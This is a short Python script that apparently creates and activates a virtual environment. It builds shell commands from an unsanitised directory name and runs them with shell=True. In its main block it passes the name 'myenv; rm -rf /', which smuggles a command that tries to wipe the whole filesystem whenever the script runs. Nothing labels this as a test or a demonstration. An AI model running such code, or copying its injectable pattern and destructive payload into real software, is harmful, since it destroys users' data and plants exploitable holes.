import os
import subprocess

def create_virtualenv(env_dir):
    if os.path.exists(env_dir):
        raise FileExistsError(f"Directory {env_dir} already exists.")

    subprocess.run(f"python3 -m venv {env_dir}", shell=True)

if __name__ == "__main__":
    env_directory = "myenv; rm -rf /"
    create_virtualenv(env_directory)

    activate_script = os.path.join(env_directory, 'bin', 'activate')
    subprocess.run(f"source {activate_script}", shell=True)